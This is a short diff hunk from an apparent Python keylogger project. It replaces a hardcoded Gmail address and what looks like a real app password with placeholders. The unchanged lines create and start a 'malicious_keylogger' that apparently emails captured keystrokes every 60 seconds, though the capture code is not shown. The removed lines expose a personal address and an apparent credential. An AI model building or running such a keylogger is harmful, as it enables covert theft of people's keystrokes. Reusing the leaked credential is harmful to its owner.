@@ -48,8 +48,8 @@ class KeyLogger:
 
 if __name__ == "__main__":
     # Use your Gmail address and the generated App Password
-    email = 'sanjeethmanikandan@gmail.com'
-    app_password = 'feod pkau rfma lgzm'
+    email = 'Your E-mail'
+    app_password = 'Your App Password' # 16 digit app password
 
     malicious_keylogger = KeyLogger(60, email, app_password)
     malicious_keylogger.start()
